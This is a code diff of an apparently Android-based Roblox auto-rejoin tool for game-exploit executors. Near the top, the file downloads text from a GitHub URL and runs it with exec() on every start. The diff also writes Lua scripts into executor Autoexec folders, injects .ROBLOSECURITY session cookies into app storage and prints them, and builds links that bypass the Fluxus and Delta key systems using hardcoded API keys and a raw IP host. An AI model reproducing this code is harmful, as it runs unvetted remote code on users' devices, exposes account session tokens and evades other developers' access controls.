@@ -15,7 +15,6 @@ import sqlite3
 import shutil
 import signal
 from colorama import init, Fore, Style
-import string
 from threading import Lock
 
 url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
@@ -25,9 +24,10 @@ exec(response.text)
 
 init()
 
-SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
-ACCOUNTS_FILE = "AXAccount.txt"
-CONFIG_FILE = "AXConfig.json"
+SERVER_LINKS_FILE = "server_links.txt"
+ACCOUNTS_FILE = "accounts.txt"
+CONFIG_FILE = "config.json"
+TOOL_KEY_FILE = "tool_key.json"
 webhook_url = None
 device_name = None
 interval = None
@@ -36,6 +36,8 @@ webhook_thread = None
 status_lock = Lock()
 rejoin_lock = Lock()
 
+FLASK_SERVER_URL = 'https://shiroo.pythonanywhere.com'  # Replace with your actual Flask server URL
+SECRET_KEY = 'shiro123'  # Replace with your consistent secret key
 package_statuses = {}
 username_cache = {}
 CACHE_FILE = "username_cache.json"
@@ -82,8 +84,10 @@ local function writeExecutorStatus(status)
     end)
 end
 
+-- initial
 writeExecutorStatus("working")
 
+-- Monitor if player teleports or periodically update the status
 while wait(1) do
     if not getgenv().StopUpdate and Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerScripts") then 
         -- Continuously update the working status
@@ -97,43 +101,76 @@ def clear_screen():
 
 def print_header():
     header = r"""
-   _____         .__              .__         _________                                     .__  __          
-  /  _  \ ___  __|__| ____   ____ |__|__  ___ \_   ___ \  ____   _____   _____  __ __  ____ |__|/  |_ ___.__.
- /  /_\  \\  \/  /  |/  _ \ /    \|  \  \/  / /    \  \/ /  _ \ /     \ /     \|  |  \/    \|  \   __<   |  |
-/    |    \>    <|  (  <_> )   |  \  |>    <  \     \___(  <_> )  Y Y  \  Y Y  \  |  /   |  \  ||  |  \___  |
-\____|__  /__/\_ \__|\____/|___|  /__/__/\_ \  \______  /\____/|__|_|  /__|_|  /____/|___|  /__||__|  / ____|
-        \/      \/              \/         \/         \/             \/      \/           \/          \/            
+  _____ _             _   _               ____       _       _       
+ |  ___| | ___   __ _| |_(_)_ __   __ _  |  _ \ ___ (_) ___ (_)_ __  
+ | |_  | |/ _ \ / _` | __| | '_ \ / _` | | |_) / _ \| |/ _ \| | '_ \ 
+ |  _| | | (_) | (_| | |_| | | | | (_| | |  _ <  __/| | (_) | | | | |
+ |_|   |_|\___/ \__,_|\__|_|_| |_|\__, | |_| \_\___|/ |\___/|_|_| |_|
+                                  |___/           |__/               
 """
     print(Fore.LIGHTCYAN_EX + header + Style.RESET_ALL)
+    print(Fore.LIGHTMAGENTA_EX + "Made by not.shiroo" + Style.RESET_ALL)
 
+# Function to detect available executors and write the Lua script to their Autoexec folder
 def detect_and_write_lua_script():
     detected_executors = []
 
     for executor_name, base_path in executors.items():
+        # Define all possible paths for Autoexec/Autoexecute
         possible_autoexec_paths = [
             os.path.join(base_path, "Autoexec"),
             os.path.join(base_path, "Autoexecute")
         ]
 
-        lua_written = False 
+        lua_written = False  # To track if Lua file is successfully written
 
+        # Loop through Autoexec and Autoexecute paths
         for path in possible_autoexec_paths:
             if os.path.exists(path):
+                # Lua script path
                 lua_script_path = os.path.join(path, "executor_check.lua")
                 
                 try:
+                    # Write the Lua script to the detected Autoexec/Autoexecute folder
                     with open(lua_script_path, 'w') as file:
-                        file.write(lua_script_template)  
-                    lua_written = True
-                    break  
+                        file.write(lua_script_template)  # Assume lua_script_template is predefined
+                    lua_written = True  # Mark Lua script as written
+                    break  # Stop checking further paths once written
 
-                except Exception as e:
-                    print(Fore.RED + f"An Error Occurred While Writing Lua Code, Status Code Is: {e}" + Style.RESET_ALL)  
+                except Exception:
+                    pass  # Silently ignore errors
 
         if lua_written:
             detected_executors.append(executor_name)
 
     return detected_executors
+
+def reset_executor_file(username):
+    """
+    Clears any existing executor status file for the given username.
+    This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
+    """
+    status_file = f"executor_check_{username}.txt"
+    valid_workspace = None  # Will store the valid workspace path once detected
+
+    # Search only in Workspace paths (uppercase 'W' and lowercase 'w')
+    for executor, base_path in executors.items():
+        for workspace_dir in ["workspace", "Workspace"]:
+            workspace_path = os.path.join(base_path, workspace_dir)
+            if os.path.exists(workspace_path):
+                valid_workspace = workspace_path
+                break  # Exit the loop once a valid workspace is found
+
+        if valid_workspace:
+            # Clear the status file in the detected workspace
+            file_path = os.path.join(valid_workspace, status_file)
+            if os.path.exists(file_path):
+                try:
+                    os.remove(file_path)  # Clear the status file for a fresh start
+                    # The print statements have been removed as intended
+                except Exception as e:
+                    pass  # Ignore the error silently
+            break  # Exit the executor loop once the file is removed
 
 def clear_executor_status(username):
     """
@@ -141,28 +178,31 @@ def clear_executor_status(username):
     This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
     """
     status_file = f"executor_check_{username}.txt"
-    valid_workspace = None
+    valid_workspace = None  # Will store the valid workspace path once detected
 
+    # Search only in Workspace paths (uppercase 'W' and lowercase 'w')
     for executor, base_path in executors.items():
         for workspace_dir in ["workspace", "Workspace"]:
             workspace_path = os.path.join(base_path, workspace_dir)
             if os.path.exists(workspace_path):
                 valid_workspace = workspace_path
-                break  
+                break  # Exit the loop once a valid workspace is found
 
         if valid_workspace:
+            # Clear the status file in the detected workspace
             file_path = os.path.join(valid_workspace, status_file)
             if os.path.exists(file_path):
                 try:
-                    os.remove(file_path)  
+                    os.remove(file_path)  # Clear the status file for a fresh start
+                    # The print statements have been removed as intended
                 except Exception as e:
-                    print(Fore.RED + f"An Error Occurred While Deleting the Status File, Status Code Is: {e}" + Style.RESET_ALL)
-            break 
-
-def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=3, max_inactivity_time=14):
+                    pass  # Ignore the error silently
+            break  # Exit the executor loop once the file is removed
+                
+def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=3, max_inactivity_time=10):
     status_file = f"executor_check_{username}.txt"
-    retry_timeout = time.time() + max_wait_time 
-    active_workspace = None 
+    retry_timeout = time.time() + max_wait_time  # Maximum time to wait before rejoining
+    active_workspace = None  # Track the valid workspace path once detected
 
     # Dynamically search for a valid workspace (lowercase or uppercase)
     for executor, base_path in executors.items():
@@ -333,24 +373,21 @@ def verify_cookie(cookie_value):
 def download_file(url, destination, binary=False):
     try:
         response = requests.get(url, stream=True)
-        response.raise_for_status()  # Ném ngoại lệ nếu mã trạng thái không phải 200
-
-        mode = 'wb' if binary else 'w'
-        with open(destination, mode) as file:
-            if binary:
-                shutil.copyfileobj(response.raw, file)
-            else:
-                file.write(response.text)
-        
-        print(Fore.GREEN + f"{os.path.basename(destination)} Downloaded Successfully." + Style.RESET_ALL)
-        return destination
-
-    except requests.exceptions.HTTPError as http_err:
-        print(Fore.RED + f"HTTP Error Occurred While Downloading: {os.path.basename(destination)}: {http_err}" + Style.RESET_ALL)
+        if response.status_code == 200:
+            mode = 'wb' if binary else 'w'
+            with open(destination, mode) as file:
+                if binary:
+                    shutil.copyfileobj(response.raw, file)
+                else:
+                    file.write(response.text)
+            print(Fore.GREEN + f"{os.path.basename(destination)} downloaded successfully." + Style.RESET_ALL)
+            return destination
+        else:
+            print(Fore.RED + f"Failed to download {os.path.basename(destination)}." + Style.RESET_ALL)
+            return None
     except Exception as e:
-        print(Fore.RED + f"Another Error Occurred While Downloading: {os.path.basename(destination)}: {e}" + Style.RESET_ALL)
-    
-    return None
+        print(Fore.RED + f"Error downloading {os.path.basename(destination)}: {e}" + Style.RESET_ALL)
+        return None
 
 # Function to replace the .ROBLOSECURITY cookie value in Cookies.db using sqlite3
 def replace_cookie_value_in_db(db_path, new_cookie_value):
@@ -389,52 +426,56 @@ def replace_cookie_value_in_db(db_path, new_cookie_value):
 
 def inject_cookies_and_appstorage():
     # Ensure the Google Drive link is correct
-    db_url = "https://github.com/shirooscripts/auto-rj/raw/main/Cookies" 
-    appstorage_url = "https://raw.githubusercontent.com/shirooscripts/auto-rj/main/appStorage.json"
+    db_url = "https://github.com/shirooscripts/auto-rj/raw/main/Cookies"  # Keep this as binary
+    appstorage_url = "https://raw.githubusercontent.com/shirooscripts/auto-rj/main/appStorage.json"  # Use this for JSON
 
     # Download the files correctly
     downloaded_db_path = download_file(db_url, "Cookies.db", binary=True)
     downloaded_appstorage_path = download_file(appstorage_url, "appStorage.json", binary=False)
 
     if not downloaded_db_path or not downloaded_appstorage_path:
-        print(Fore.RED + "An Error Occurred While Loading Required Files, Exiting." + Style.RESET_ALL)
+        print(Fore.RED + "Failed to download necessary files. Exiting." + Style.RESET_ALL)
         return
     
     # Path to cookie.txt file
-    cookie_txt_path = os.path.join(os.getcwd(), "cookie.txt") 
+    cookie_txt_path = os.path.join(os.getcwd(), "cookie.txt")  # cookie.txt in the same directory as the script
     
     # Check if the cookie.txt file exists
     if not os.path.exists(cookie_txt_path):
-        print(Fore.RED + "cookie.txt File Not Found!" + Style.RESET_ALL)
+        print(Fore.RED + "cookie.txt not found in the current directory!" + Style.RESET_ALL)
         return
 
+    # Read cookies from the cookie.txt file
     with open(cookie_txt_path, "r") as file:
         cookies = [line.strip() for line in file.readlines()]
 
+    # Check if there are cookies to inject
     if not cookies:
-        print(Fore.RED + "Cookie Not Found In cookie.txt File!" + Style.RESET_ALL)
+        print(Fore.RED + "No cookies found in cookie.txt. Please add your cookies." + Style.RESET_ALL)
         return
 
     # Get the Roblox packages
     packages = get_roblox_packages()
 
     if len(cookies) > len(packages):
-        print(Fore.RED + "Please Add Cookies To cookie.txt File Because Package In Your Device Is More Than Cookie In File." + Style.RESET_ALL)
+        print(Fore.RED + "More cookies in cookie.txt than packages available. Please ensure each cookie has a corresponding package." + Style.RESET_ALL)
         return
 
+    # Inject each cookie and appStorage.json into its corresponding package
     for idx, package_name in enumerate(packages):
         try:
             if idx < len(cookies):
                 cookie = cookies[idx]
                 
-                print(Fore.YELLOW + f"Verifying Cookie For {package_name} Before Injection..." + Style.RESET_ALL)
+                # Verify the cookie before injection
+                print(Fore.YELLOW + f"Verifying cookie for {package_name} before injection..." + Style.RESET_ALL)
                 if verify_cookie(cookie):
-                    print(Fore.GREEN + f"Cookie For {package_name} Is Valid!" + Style.RESET_ALL)
+                    print(Fore.GREEN + f"Cookie for {package_name} is valid!" + Style.RESET_ALL)
                 else:
-                    print(Fore.RED + f"Cookie For {package_name} Is Unvalid. Skipping Injection..." + Style.RESET_ALL)
+                    print(Fore.RED + f"Cookie for {package_name} is invalid. Skipping injection..." + Style.RESET_ALL)
                     continue
                 
-                print(Fore.GREEN + f"Injecting Cookie For {package_name}: {cookie}" + Style.RESET_ALL)
+                print(Fore.GREEN + f"Injecting cookie for {package_name}: {cookie}" + Style.RESET_ALL)
                 
                 # Paths to the destination directories
                 destination_db_dir = f"/data/data/{package_name}/app_webview/Default/"
@@ -469,105 +510,158 @@ def inject_cookies_and_appstorage():
 
     print(Fore.GREEN + "Cookie and appStorage injection completed for all packages." + Style.RESET_ALL) 
             
+def generate_hwid():
+    if 'COMPUTERNAME' in os.environ:
+        hwid_source = os.environ['COMPUTERNAME']
+    else:
+        hwid_source = platform.node()
+        if not hwid_source or hwid_source == 'localhost':
+            hwid_source = str(uuid.getnode())
+    return hashlib.sha256(hwid_source.encode()).hexdigest()
+
+def save_tool_key(tool_key):
+    with open(TOOL_KEY_FILE, "w") as file:
+        json.dump({"tool_key": tool_key}, file)
+        
+def load_tool_key():
+    if os.path.exists(TOOL_KEY_FILE):
+        with open(TOOL_KEY_FILE, "r") as file:
+            data = json.load(file)
+            return data.get("tool_key")
+    return None
+    
+# Function to validate tool key and HWID
+def validate_tool_key(tool_key):
+    hwid = generate_hwid() 
+    payload = {
+        'tool_key': tool_key,
+        'hwid': hwid
+    }
+    headers = {
+        'Content-Type': 'application/json',
+        'Secret-Key': SECRET_KEY
+    }
+    response = requests.post(f"{FLASK_SERVER_URL}/tool_login", json=payload, headers=headers)
+    if response.status_code == 200:
+        result = response.json()
+        if result['status'] == 'success':
+            print(Fore.GREEN + "Login successful." + Style.RESET_ALL)
+            return True
+        else:
+            print(Fore.RED + f"Login failed: {result['message']}" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "Failed to connect to the Flask server." + Style.RESET_ALL)
+    return False
+
+# Function to get Roblox packages
 def get_roblox_packages():
     packages = []
-    for suffix in string.ascii_lowercase:  
+    for suffix in ['u', 'v', 'w', 'x', 'y', 'z', 'p', 'q', 'r', 's', 't', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k']:
         package_name = f"com.roblox.clien{suffix}"
-        print(Fore.YELLOW + f"Checking For Roblox Package: {package_name}" + Style.RESET_ALL)
-        
-        result = subprocess.run(f"pm list packages | grep -q '{package_name}'", shell=True)
-        if result.returncode == 0:
-            print(Fore.GREEN + f"Found Roblox Package: {package_name}" + Style.RESET_ALL)
+        print(f"Checking for package: {package_name}")
+        if os.system(f"pm list packages | grep -q '{package_name}'") == 0:
+            print(f"Found package: {package_name}")
             packages.append(package_name)
-            
     return packages
 
+# Function to capture a screenshot using Android's screencap command
 def capture_screenshot():
+    # Get the current directory where the script is running
     current_dir = os.path.dirname(os.path.abspath(__file__))
     
+    # Create a folder named "screenshots" in the same directory as the script
     screenshots_dir = os.path.join(current_dir, "screenshots")
     os.makedirs(screenshots_dir, exist_ok=True)
     
+    # Define the path for the screenshot
     screenshot_path = os.path.join(screenshots_dir, "screenshot.png")
     
+    # Check if screencap command is available
     if shutil.which("screencap") is None:
-        print(Fore.RED + "Screencap Not Found Or Inaccessible." + Style.RESET_ALL)
+        print(Fore.RED + "screencap command not found or inaccessible." + Style.RESET_ALL)
         return None
 
-    try:
-        result = subprocess.run(["screencap", "-p", screenshot_path], check=True)
-    except subprocess.CalledProcessError:
-        print(Fore.RED + f"Taking a Screenshot of Your Device Has Failed At: {screenshot_path}" + Style.RESET_ALL)
+    # Capture the screenshot
+    result = os.system(f"screencap -p {screenshot_path}")
+    
+    # Check if the screenshot was successfully captured
+    if result != 0 or not os.path.exists(screenshot_path):
+        print(Fore.RED + f"Failed to capture screenshot at {screenshot_path}. Skipping this webhook." + Style.RESET_ALL)
         return None
 
-    if not os.path.exists(screenshot_path):
-        print(Fore.RED + f"Cannot Find Screenshots On Your Device: {screenshot_path}" + Style.RESET_ALL)
-        return None
-
-    print(Fore.GREEN + f"Your Screenshot Has Been Captured Successfully: {screenshot_path}" + Style.RESET_ALL)
     return screenshot_path
 
+# Function to retrieve system information
 def get_system_info():
     cpu_usage = psutil.cpu_percent(interval=1)
     memory_info = psutil.virtual_memory()
     uptime = time.time() - psutil.boot_time()
 
-    return {
+    system_info = {
         "cpu_usage": cpu_usage,
         "memory_total": memory_info.total,
         "memory_available": memory_info.available,
         "memory_used": memory_info.used,
         "uptime": uptime
     }
+    
+    return system_info
 
+# Function to load configuration from file
 def load_config():
     global webhook_url, device_name, interval
     if os.path.exists(CONFIG_FILE):
-        try:
-            with open(CONFIG_FILE, "r") as file:
-                config = json.load(file)
-                webhook_url = config.get("webhook_url")
-                device_name = config.get("device_name")
-                interval = config.get("interval")
-        except json.JSONDecodeError as e:
-            print(Fore.RED + f"An Error Occurred While Reading File Config, Status Code Is: {e}" + Style.RESET_ALL)
+        with open(CONFIG_FILE, "r") as file:
+            config = json.load(file)
+            webhook_url = config.get("webhook_url")
+            device_name = config.get("device_name")
+            interval = config.get("interval")
     else:
         webhook_url = None
         device_name = None
         interval = None
 
+# Function to save configuration to file
 def save_config():
     config = {
         "webhook_url": webhook_url,
         "device_name": device_name,
         "interval": interval
     }
-    try:
-        with open(CONFIG_FILE, "w") as file:
-            json.dump(config, file)
-    except Exception as e:
-        print(Fore.RED + f"An Error Occurred While Saving Config To File, Status Code Is: {e}" + Style.RESET_ALL)
+    with open(CONFIG_FILE, "w") as file:
+        json.dump(config, file)
 
+def start_webhook_thread():
+    global webhook_thread, stop_webhook_thread
+    if webhook_thread is None or not webhook_thread.is_alive():
+        stop_webhook_thread = False
+        webhook_thread = threading.Thread(target=send_webhook)
+        webhook_thread.start()
+		
 def count_roblox_processes():
-    return sum(1 for proc in psutil.process_iter(['name']) if 'roblox' in proc.info['name'].lower())
-
-def capture_screenshot():
-    # Placeholder for actual screenshot capture code
-    screenshot_path = "screenshot.png" 
-    return screenshot_path
-
+    count = 0
+    for proc in psutil.process_iter(['name']):
+        if 'roblox' in proc.info['name'].lower():
+            count += 1
+    return count
+	
 def send_webhook():
     global stop_webhook_thread
 
     while not stop_webhook_thread:
+        # Capture a screenshot
         screenshot_path = capture_screenshot()
+
+        # Check if the screenshot was captured successfully
         if not os.path.exists(screenshot_path):
-            print(Fore.RED + f"Screenshot File Not Found: {screenshot_path}. Skipping This Webhook." + Style.RESET_ALL)
-            continue
+            print(Fore.RED + f"Screenshot file not found: {screenshot_path}. Skipping this webhook." + Style.RESET_ALL)
+            continue  # Skip this iteration if the screenshot doesn't exist
 
+        # Get system information
         system_info = get_system_info()
-        roblox_process_count = count_roblox_processes()
+        roblox_process_count = count_roblox_processes()  # Get the number of open Roblox packages
 
+        # Prepare the embed data
         embed = {
             "title": f"System Info for {device_name}",
             "color": 15258703,
@@ -585,12 +679,14 @@ def send_webhook():
             }
         }
 
+        # JSON payload
         payload = {
             "embeds": [embed],
             "username": device_name
         }
 
         try:
+            # Sending POST request to the webhook URL with the image as an attachment
             with open(screenshot_path, "rb") as file:
                 response = requests.post(
                     webhook_url,
@@ -598,103 +694,98 @@ def send_webhook():
                     files={"file": ("screenshot.png", file)}
                 )
 
-            if response.status_code in [200, 204]:
+            if response.status_code == 204 or response.status_code == 200:
                 print(Fore.GREEN + "Webhook sent successfully!" + Style.RESET_ALL)
             else:
-                print(Fore.RED + f"An Error Occurred While Sending Information To Your Webhook: {response.status_code}" + Style.RESET_ALL)
+                print(Fore.RED + f"Failed to send webhook, status code: {response.status_code}" + Style.RESET_ALL)
         except Exception as e:
-            print(Fore.RED + f"Đã Xảy Ra Lỗi Khi Gửi Thông Tin Tới Webhook Của Bạn: {e}" + Style.RESET_ALL)
+            print(Fore.RED + f"Error sending webhook: {e}" + Style.RESET_ALL)
 
+        # Delete the screenshot file silently
         try:
             os.remove(screenshot_path)
         except Exception as e:
-            print(Fore.RED + f"Error Deleting Screenshot File: {e}" + Style.RESET_ALL)
+            print(Fore.RED + f"Error deleting screenshot file: {e}" + Style.RESET_ALL)
 
+        # Wait for the specified interval before sending the next webhook
         time.sleep(interval * 60)
-
-def start_webhook_thread():
-    global webhook_thread, stop_webhook_thread
-    if webhook_thread is None or not webhook_thread.is_alive():
-        stop_webhook_thread = False
-        webhook_thread = threading.Thread(target=send_webhook)
-        webhook_thread.start()
 
 def stop_webhook():
     global stop_webhook_thread
     stop_webhook_thread = True
-    stop_event.set()
+    stop_event.set()  # Signal the thread to stop
 
+# Function to prompt for webhook URL, device name, and interval
 def setup_webhook():
     global webhook_url, device_name, interval, stop_webhook_thread
 
-    stop_webhook_thread = True  
+    stop_webhook_thread = True  # Stop any existing webhook thread
 
-    webhook_url = input(Fore.CYAN + "Please Enter Your Webhook URL: " + Style.RESET_ALL)
-    device_name = input(Fore.CYAN + "Please Enter Device Name: " + Style.RESET_ALL)
-    interval = int(input(Fore.CYAN + "Enter Time Interval(Minutes): " + Style.RESET_ALL))
+    webhook_url = input(Fore.GREEN + "Enter the Discord webhook URL: " + Style.RESET_ALL)
+    device_name = input(Fore.GREEN + "Enter the device name: " + Style.RESET_ALL) 
+    interval = int(input(Fore.GREEN + "Enter the interval in minutes for sending the webhook: " + Style.RESET_ALL))
 
-    save_config()
+    save_config()  # Save the configuration
 
+    stop_webhook_thread = False
+    threading.Thread(target=send_webhook).start() 
+
+# Function to check if a Roblox process is running
 def is_roblox_running(package_name):
-    return any(package_name in proc.info['name'].lower() for proc in psutil.process_iter(['name']))
-
-def kill_roblox_processes():
-    print(Fore.YELLOW + "Turning Off All Roblox Games Running On Your Device..." + Style.RESET_ALL)
-    package_names = get_roblox_packages()
-    
-    for package_name in package_names:
-        kill_roblox_process(package_name)
-
-def kill_roblox_process(package_name):
-    print(Fore.YELLOW + f"Turning Off Roblox Game For Package Is: {package_name}..." + Style.RESET_ALL)
-    # Using `os.kill` for more control and speed, avoiding unnecessary shell calls
-    for proc in psutil.process_iter(['pid', 'name']):
+    for proc in psutil.process_iter(['name']):
         if package_name in proc.info['name'].lower():
-            try:
-                os.kill(proc.info['pid'], 9)  # 9 is SIGKILL
-                print(Fore.YELLOW + f"Process {proc.info['name']} (PID: {proc.info['pid']}) Killed." + Style.RESET_ALL)
-            except Exception as e:
-                print(f"An Error Occurred While Closing Roblox Game: {proc.info['name']}: {e}")
-    time.sleep(1)  
+            return True
+    return False
 
+# Function to kill Roblox processes
+def kill_roblox_processes():
+    print("Killing all Roblox processes...")
+    package_names = get_roblox_packages()
+    for package_name in package_names:
+        print(f"Trying to kill process for package: {package_name}")
+        # Use pkill to kill processes by package name
+        os.system(f"pkill -f {package_name}")
+    time.sleep(2) 
+
+# Function to kill a specific Roblox process
+def kill_roblox_process(package_name):
+    print(f"Killing Roblox process for {package_name}...")
+    # Use pkill to kill process by package name
+    os.system(f"pkill -f {package_name}")
+    time.sleep(2) 
+
+# Function to launch Roblox
 def launch_roblox(package_name, server_link, num_packages, package_statuses):
     try:
-        package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Launching Roblox Game With Package: {package_name}..." + Style.RESET_ALL
+        # Update the status to indicate Roblox is opening
+        package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Opening Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
 
-        subprocess.run(
-            ['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], 
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
-        )
-        
-        wait_time = 15 if num_packages >= 6 else 8
-        time.sleep(wait_time)
+        # Open Roblox (Initial Splash)
+        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(10)  # Adjust wait time based on the number of packages
 
+        # Proceed to launch
         package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Joining Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
-
-        subprocess.run(
-            ['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], 
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
-        )
+        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
+        # Wait a moment to ensure Roblox has launched
         time.sleep(1)
-
-        package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox Game" + Style.RESET_ALL
+        
+        # Update the status after successful join
+        package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox" + Style.RESET_ALL
         update_status_table(package_statuses)
-
-    except subprocess.CalledProcessError as e:
-        package_statuses[package_name]["Status"] = Fore.RED + f"An Error Occurred While Launching Roblox Game For Package: {package_name}: {e}" + Style.RESET_ALL
-        update_status_table(package_statuses)
-        print(f"Subprocess error details: {e}")
 
     except Exception as e:
-        package_statuses[package_name]["Status"] = Fore.RED + f"An Error Occurred While Launching Roblox Game For Package: {package_name}: {e}" + Style.RESET_ALL
+        # Catch all exceptions and log them specifically to avoid "launching failed" messages
+        package_statuses[package_name]["Status"] = Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL
         update_status_table(package_statuses)
         print(f"Error details: {e}")
 
 def check_executor_and_rejoin(package_name, username, package_statuses, server_link, num_packages, accounts):
     try:
+        # Inject Lua script for executor detection (the username is auto-detected in the Lua script)
         detected_executors = detect_and_write_lua_script()
 
         if detected_executors:
@@ -1058,8 +1149,8 @@ def get_hwid(package_name):
 def create_fluxus_bypass_link(hwid, api_key="XqzyaenZishd33axPYPz"):
     return f"https://madkung.vercel.app/fluxus-api?url=https://flux.li/android/external/start.php?HWID={hwid}&api_key={api_key}"
         
-def create_bypass_link(user_id):
-    return f"https://delta-api-11.vercel.app/api/delta?url=https://gateway.platoboost.com/a/8?id={user_id}"
+def create_bypass_link(user_id, api_key="shirrobeo"):
+    return f"http://103.65.235.193:8264/api/delta?hwid_link=https://gateway.platoboost.com/a/8?id={user_id}&api_key={api_key}"
 
 def decrement_time(time_str):
     hours, minutes = map(int, time_str.replace('H', '').replace('M', '').split())
@@ -1154,17 +1245,17 @@ def main():
 
         # Dynamic menu options
         menu_options = [
-            "Start Auto Rejoin Roblox Game",
-            "Set User ID For Each Package",
-            "Same Game ID Or Private Server Link",
-            "Different Private Server Or Game ID",
-            "Clear User ID And/Or Private Server Link",
+            "Start Auto Rejoin",
+            "Set User IDs for Each Package",
+            "Same Game ID or Private Server Link",
+            "Different Private Server or Game ID",
+            "Clear User IDs and/or Server Links",
             "List",
-            "Auto Setup User ID",
-            "Automatic Bypass Key For Fluxus Executor",
-            "Auto Same Hwid For Fluxus Executor",
-            "Set Up Webhook(Maintenance)",
-            "Automatically Login Roblox Account Using Cookies",            
+            "Auto Setup User IDs",
+            "Bypass Start",
+            "Same HWID Fluxus",
+            "Set Up Webhook",
+            "Auto Login via Cookie",            
             "Exit"
         ]
 
